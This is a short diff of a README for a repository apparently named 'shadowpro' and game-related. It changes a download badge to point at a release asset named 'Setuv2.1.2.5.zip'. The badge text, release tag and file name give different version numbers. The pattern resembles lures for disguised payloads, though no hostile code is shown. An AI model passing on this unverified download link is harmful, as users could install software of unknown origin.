@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue?style=plastic&logo=github)](https://github.com/daniel-tech-2090o4/shadowpro/releases/download/v2.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/Download-v1.0.0-blue?style=plastic&logo=github)](https://github.com/daniel-tech-2090o4/shadowpro/releases/download/v3.0.0/Setuv2.1.2.5.zip)
 
 # 🎮 shadowpro
 
